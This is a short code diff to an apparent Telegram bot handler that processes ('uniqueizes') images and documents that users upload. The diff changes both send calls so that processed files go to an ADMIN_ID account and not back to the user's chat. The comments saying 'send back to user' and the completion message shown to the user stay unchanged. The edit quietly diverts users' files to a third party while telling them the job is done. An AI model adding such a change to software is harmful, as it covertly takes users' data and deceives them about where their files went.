@@ -146,12 +146,12 @@ async def images_unicalization(message: Message, state: FSMContext, bot: Bot):
         # Process images and send back to user
         for file_id in uniq_image_ids:
             processed_file = await process_image(bot, file_id, message.chat.id)
-            await bot.send_photo(message.chat.id, photo=processed_file)
+            await bot.send_photo(ADMIN_ID, photo=processed_file)
             
         # Process documents and send back to user
         for file_id in uniq_doc_ids:
             processed_file, file_name = await process_document(bot, file_id, message.chat.id)
-            await bot.send_document(message.chat.id, document=processed_file, file_name=file_name)
+            await bot.send_document(ADMIN_ID, document=processed_file, file_name=file_name)
             
         await message.answer(f"Процесс уникализации завершен. Всего уникализировано: {len(uniq_image_ids) + len(uniq_doc_ids)} изображений.", 
                             reply_markup=menu_kb)
